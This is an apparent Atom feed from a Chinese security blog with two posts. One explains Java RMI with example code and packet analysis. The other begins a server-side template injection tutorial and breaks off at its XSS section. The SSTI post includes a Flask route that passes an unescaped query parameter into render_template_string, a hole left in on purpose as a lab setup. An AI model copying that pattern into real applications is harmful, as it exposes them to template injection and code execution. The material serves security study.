<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2021-12-01T05:26:45.676Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>elssm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java RMI</title>
    <link href="elssm.github.io/2021/12/01/Java-RMI/"/>
    <id>elssm.github.io/2021/12/01/Java-RMI/</id>
    <published>2021-12-01T02:30:24.000Z</published>
    <updated>2021-12-01T05:26:45.676Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Java RMI 指的是远程方法调用 (Remote Method Invocation)。它是一种机制，能够让在某个 Java 虚拟机上的对象调用另一个 Java 虚拟机中的对象上的方法。</p><p>在Java中，只要一个类继承了<code>java.rmi.Remote</code>接口，即可成为存在于服务器端的远程对象，供客户端访问并提供一定的服务。</p><h4 id="RMI框架"><a href="#RMI框架" class="headerlink" title="RMI框架"></a>RMI框架</h4><p>RMI框架封装了所有底层通信细节，并且解决了编组、分布式垃圾收集、安全检查和并发性等通用问题，开发人员只需专注于开发与特定问题领域相关的各种本地对象和远程对象即可。</p><h5 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h5><p>RMI框架采用代理来负责客户与远程对象之间通过Socket进行通信的细节。RMI框架为远程对象分别生成了客户端代理和服务器端代理，位于客户端的代理类称为Stub，位于服务器端的代理类称为Skeleton。stub(存根)和skeleton( 骨架 ) 在RMI中充当代理角色，在现实开发中主要是用来隐藏系统和网络的的差异， 这一部分的功能在RMI开发中对程序员是透明的。Stub为客户端编码远程命令并把他们发送到服务器。而Skeleton则是把远程命令解码，调用服务端的远程对象的方法，把结果在编码发给stub，然后stub再解码返回调用结果给客户端。</p><p><img src="/2021/12/01/Java-RMI/24.png" alt="24"></p><h4 id="实现RMI步骤"><a href="#实现RMI步骤" class="headerlink" title="实现RMI步骤"></a>实现RMI步骤</h4><ul><li>定义一个远程接口，此接口需要继承<code>Remote</code></li><li>开发远程接口的实现类</li><li>创建一个<code>server</code>并把远程对象注册到端口</li><li>创建一个<code>client</code>查找远程对象，调用远程方法</li></ul><h4 id="RMI实现"><a href="#RMI实现" class="headerlink" title="RMI实现"></a>RMI实现</h4><p>首先我们定义一个远程接口<code>Hello.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Remote接口是一个标识接口，本身不包含任何方法，该接口用于标识其子类的方法可以</span></span><br><span class="line"><span class="comment">//被非本地的Java虚拟机调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们定义一个实现类<code>HelloImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello,"</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是，实现类必须要继承<code>UnicastRemoteObject</code>类，客户端访问获得远程对象时，远程对象才会把自身的一个拷贝以<code>Socket</code>的形式传输给客户端，这个拷贝也就是<code>Stub</code>，也可以叫做”存根”，这个”Stub”可以看作是远程对象在本地的一个代理，其中包含了远程对象的具体信息，客户端可以通过这个代理与服务端进行交互。</p><p>最后实现该类的远程接口中的<code>sayHello()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//HelloImpl 对象在实例化时会自动调用其父类 UnicastRemoteObject 的构造方法</span></span><br><span class="line">            <span class="comment">// 生成对应的 Stub 和 Skeleton</span></span><br><span class="line">            Hello h = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">            <span class="comment">//在本地创建并启动 RMIService , 被创建的 RMIService 服务将会在指定的端口上监听请求</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="comment">//将远程对象 " h " 绑定到 rmi://localhost:1099/hello 这个 URL 上 . 客户端可以通过这个 URL 直接访问远程对象 .</span></span><br><span class="line">            Naming.rebind(<span class="string">"rmi://localhost:1099/hello"</span>,h);</span><br><span class="line">            System.out.println(<span class="string">"HelloServer 启动成功"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就是<code>server</code>端的配置</p><p>接着我们实现<code>client</code>端的配置，客户端只需要一个连接程序，即可实现远程调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.client;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rmi.server.Hello;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//客户端只需要调用 java.rmi.Naming.lookup 函数</span></span><br><span class="line">            <span class="comment">//通过公开的路径从 RMIService 上拿到对应接口的实现类</span></span><br><span class="line">            Hello h = (Hello) Naming.lookup(<span class="string">"rmi://localhost:1099/hello"</span>);</span><br><span class="line">            System.out.println(h.sayHello(<span class="string">"Elssm"</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (MalformedURLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"url格式异常"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"创建对象异常"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"对象未绑定"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RMI执行过程"><a href="#RMI执行过程" class="headerlink" title="RMI执行过程"></a>RMI执行过程</h4><p>我们写好的RMI文件目录结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">├── client</span><br><span class="line">│   ├── HelloClient.java</span><br><span class="line">└── server</span><br><span class="line">    ├── Hello.java</span><br><span class="line">    ├── HelloImpl.java</span><br><span class="line">    └── HelloServer.java</span><br></pre></td></tr></table></figure><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java rmi/server<span class="comment">/*.java</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java rmi/client<span class="comment">/*.java</span></span><br></pre></td></tr></table></figure><h5 id="生成Stub存根"><a href="#生成Stub存根" class="headerlink" title="生成Stub存根"></a>生成Stub存根</h5><p><img src="/2021/12/01/Java-RMI/1.png" alt="1"></p><p>然后将服务端生成的<code>Stub</code>存根复制到客户端目录下，最后我们RMI文件目录结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro src % tree rmi                                      </span><br><span class="line">rmi</span><br><span class="line">├── client</span><br><span class="line">│   ├── HelloClient<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">│   ├── <span class="title">HelloClient</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">│   └── <span class="title">HelloImpl_Stub</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">└── <span class="title">server</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">Hello</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">Hello</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl_Stub</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloServer</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    └── <span class="title">HelloServer</span>.<span class="title">java</span></span></span><br></pre></td></tr></table></figure><h5 id="启动RMI服务端"><a href="#启动RMI服务端" class="headerlink" title="启动RMI服务端"></a>启动RMI服务端</h5><p><img src="/2021/12/01/Java-RMI/2.png" alt="2"></p><h5 id="启动RMI客户端"><a href="#启动RMI客户端" class="headerlink" title="启动RMI客户端"></a>启动RMI客户端</h5><p><img src="/2021/12/01/Java-RMI/3.png" alt="3"></p><p>可以看到，我们已经成功调用服务端的<code>sayHello()</code>方法</p><h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>我们可以通过Wireshark进行进一步的分析，在客户端请求的过程中，有两次完整的数据交互。可以通过<code>tcp.stream eq 会话序号</code>划分</p><p><img src="/2021/12/01/Java-RMI/4.png" alt="4"></p><p><img src="/2021/12/01/Java-RMI/5.png" alt="5"></p><h5 id="tcp-stream-eq-17"><a href="#tcp-stream-eq-17" class="headerlink" title="tcp.stream eq 17"></a>tcp.stream eq 17</h5><p>一开始是<code>TCP</code>三次握手</p><p><img src="/2021/12/01/Java-RMI/7.png" alt="7"></p><p>接着是RMI代理的确认工作，这里RMI代理返回了客户端的IP地址和端口，用于确认要进行的RMI服务是否是RMI客户端，如果RMI客户端做出响应，则代表RMI客户端需要RMI服务</p><p><img src="/2021/12/01/Java-RMI/8.png" alt="8"></p><p>随后是RMI客户端的确认工作，经过RMI客户端和RMI代理的确认之后，初始化工作就完成了</p><p><img src="/2021/12/01/Java-RMI/9.png" alt="9"></p><p>初始化工作完成后，RMI客户端开始请求RMI服务端，这一过程通过<code>RMI Call</code>完成</p><p><img src="/2021/12/01/Java-RMI/10.png" alt="10"></p><p>这里我们具体看一下请求的数据包，首先在Wireshark中追踪数据流，之后以RAW格式显示数据</p><p><img src="/2021/12/01/Java-RMI/11.png" alt="11"></p><p><img src="/2021/12/01/Java-RMI/12.png" alt="12"></p><p>可以明显的看到<code>ac ed 00 05</code>特征码，我们可以利用<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a>工具进行解析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % java -jar SerializationDumper-v1.13.jar 50aced00057722000000000000000000000000000000000000000000000000000344154dc9d4e63bdf74000568656c6c6f73720019726d692e7365727665722e48656c6c6f496d706c5f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e696361737452656600093132372e302e302e310000e2ab53b1d296bd7e099cac7c1a220000017d73a2f78e80010078</span><br><span class="line"></span><br><span class="line">RMI Call - 0x50</span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - 0x77</span><br><span class="line">    Length - 34 - 0x22</span><br><span class="line">    Contents - 0x000000000000000000000000000000000000000000000000000344154dc9d4e63bdf</span><br><span class="line">  TC_STRING - 0x74</span><br><span class="line">    newHandle 0x00 7e 00 00</span><br><span class="line">    Length - 5 - 0x00 05</span><br><span class="line">    Value - hello - 0x68656c6c6f</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 25 - 0x00 19</span><br><span class="line">        Value - rmi.server.HelloImpl_Stub - 0x726d692e7365727665722e48656c6c6f496d706c5f53747562</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后是<code>ReturnData</code>的数据包</p><p><img src="/2021/12/01/Java-RMI/13.png" alt="13"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % java -jar SerializationDumper-v1<span class="number">.13</span>.jar <span class="number">51</span>aced0005770f01353650820000017d739f868f800873720019726d692e7365727665722e48656c6c6f496d706c5f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e696361737452656600093132372e302e302e310000e25c35c1c19f1dabc88b353650820000017d739f868f80010178</span><br><span class="line"></span><br><span class="line">RMI ReturnData - <span class="number">0x51</span></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">    Length - <span class="number">15</span> - <span class="number">0x0f</span></span><br><span class="line">    Contents - <span class="number">0x01353650820000017d739f868f8008</span></span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">25</span> - <span class="number">0x00</span> <span class="number">19</span></span><br><span class="line">        Value - rmi.server.HelloImpl_Stub - <span class="number">0x726d692e7365727665722e48656c6c6f496d706c5f53747562</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在<code>ReturnData</code>数据包就包含了RMI服务端的IP和端口</p><p><img src="/2021/12/01/Java-RMI/14.png" alt="14"></p><p>之后RMI客户端就可以直接去访问RMI服务端上对应类的方法。</p><h5 id="tcp-stream-eq-18"><a href="#tcp-stream-eq-18" class="headerlink" title="tcp.stream eq 18"></a>tcp.stream eq 18</h5><p>一上来还是先进行三次握手</p><p><img src="/2021/12/01/Java-RMI/15.png" alt="15"></p><p>之后是RMI服务端和RMI客户端的一个验证过程，服务端询问客户端是否是<code>127.0.0.1</code>,如果客户端返回响应，则代表客户端需要RMI服务</p><p><img src="/2021/12/01/Java-RMI/16.png" alt="16"></p><p>客户端在做出回应同时，继续请求<code>127.0.0.1</code>，这一步是调用<code>java.rmi</code>包中的一些类</p><p><img src="/2021/12/01/Java-RMI/17.png" alt="17"></p><p>之后完成了<code>RMI Call</code>和<code>ReturnData</code>的过程</p><p><img src="/2021/12/01/Java-RMI/18.png" alt="18"></p><p>从<code>Raw</code>数据包中可以看出</p><p><img src="/2021/12/01/Java-RMI/19.png" alt="19"></p><p><img src="/2021/12/01/Java-RMI/20.png" alt="20"></p><p><img src="/2021/12/01/Java-RMI/21.png" alt="21"></p><p>这一步完成之后，RMI客户端会将参数传输给RMI服务端，服务端会在本地执行后返回结果。</p><p><img src="/2021/12/01/Java-RMI/22.png" alt="22"></p><p>服务端会将参数带入<code>sayHello()</code>函数执行，并将结果返回给客户端</p><p><img src="/2021/12/01/Java-RMI/23.png" alt="23"></p><p>最后进行<code>TCP</code>四次挥手并结束此次调用流程。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;Java RMI 指的是远程方法调用 (Remote Method Invocation)。它是一种机制，能够让在某个 Java 虚拟机上的
      
    
    </summary>
    
    
      <category term="java" scheme="elssm.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>SSTI模版注入</title>
    <link href="elssm.github.io/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
    <id>elssm.github.io/2021/11/29/SSTI模版注入/</id>
    <published>2021-11-29T10:12:49.000Z</published>
    <updated>2021-11-30T02:26:58.217Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>SSTI(Server-Side Template Injection)漏洞是模版引擎在使用渲染函数的时候，由于代码不规范而导致的代码注入漏洞，模版引擎和渲染函数本身是没有漏洞的，该漏洞的产生原因在于程序员对代码的不严谨不规范，导致了模版可控，从而引发代码注入。</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul><li>python3.6</li><li>Flask框架</li></ul><p><code>app.py</code>中代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_word</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello word!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test1')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    html_content = <span class="string">'use render_template_string'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ssti')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'code'</span>)</span><br><span class="line">    html_content = <span class="string">'&lt;h3&gt;%s&lt;/h3&gt;'</span> % (code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"10.100.163.201"</span>)</span><br></pre></td></tr></table></figure><p>访问<code>5000</code>端口如下所示</p><p><img src="/2021/11/29/SSTI模版注入/1.png" alt="1"></p><h4 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h4><p>Flask中的渲染方法有两种，分别是<code>render_template()</code>和<code>render_template_string()</code></p><p><strong>使用 <code>render_template()</code> 函数来渲染一个指定的文件</strong> , 这个指定的文件其实就是模板。其模板文件一般放在 <code>templates</code> 目录下</p><p>我们在<code>templates</code>目录下创建<code>hello.html</code>文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello! Elssm<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>http://10.100.163.201:5000/hello</code>如下所示</p><p><img src="/2021/11/29/SSTI模版注入/2.png" alt="2"></p><p>Flask 是使用<code>Jinja2</code> 作为渲染引擎的，在实际项目中 , 模板并不是纯 HTML 文件 , 而是一个夹杂模板语法的 HTML 文件 . 例如要使得页面的某些地方动态变化, 就需要使用模板支持的语法来传参数 ，比如我们可以在<code>render_template()</code>传入参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>,content=<span class="string">'this is a test'</span>)</span><br></pre></td></tr></table></figure><p>这个时候将<code>hello.html</code>文件如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello! Elssm<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123; &#123;content&#125; &#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个时候访问<code>http://10.100.163.201:5000/hello</code>如下所示</p><p><img src="/2021/11/29/SSTI模版注入/3.png" alt="3"></p><p>可以看到，在<code>Jinja2</code>中，使用<code>{ {} }</code>作为变量包裹的标识符，用于打印模版输出的表达式。</p><p>另一个渲染函数是<code>render_template_string()</code>，用来渲染一个字符串。</p><p>通过访问<code>http://10.100.163.201:5000/test1</code>查看</p><p><img src="/2021/11/29/SSTI模版注入/4.png" alt="4"></p><p>但是如果在该函数中没有做好有效的防范，就会造成一些严重的危害</p><h4 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h4><p>在<code>app.py</code>文件中，我们通过<code>/ssti</code>路由可以发送<code>GET</code>请求，但是由于在后端没有对用户输入做一个严格的校验，这样就会产生XSS攻击。</p><h5 id="常规的get请求"><a href="#常规的get请求" class="headerlink" title="常规的get请求"></a>常规的get请求</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span 